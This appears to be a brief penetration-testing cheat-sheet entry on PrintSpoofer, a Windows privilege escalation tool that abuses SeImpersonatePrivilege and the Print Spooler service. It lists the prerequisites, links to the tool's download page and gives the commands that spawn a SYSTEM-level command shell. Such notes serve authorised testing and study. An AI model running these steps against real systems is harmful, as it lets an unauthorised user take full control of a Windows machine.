 Printspoofer - Privilege Escalation via Print Spooler Impersonation

### <span style="color:#50FA7B">Requirements</span>

- Local user with:
  - `SeImpersonatePrivilege`
  - Access to a system with the **Print Spooler service running**
- Windows 10 or Server 2016/2019 (unpatched)
### <span style="color:#50FA7B">Exploitation Steps</span>

1. **Download PrintSpoofer**
   - [Download from GitHub Releases](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)
   - Choose the correct binary: `PrintSpoofer.exe` (x64 or x86)
1. **Execute with SYSTEM impersonation**
   ```bash
   ./PrintSpoofer.exe -i -c cmd
   # OR
   PrintSpoofer64.exe -i -c cmd
   ```

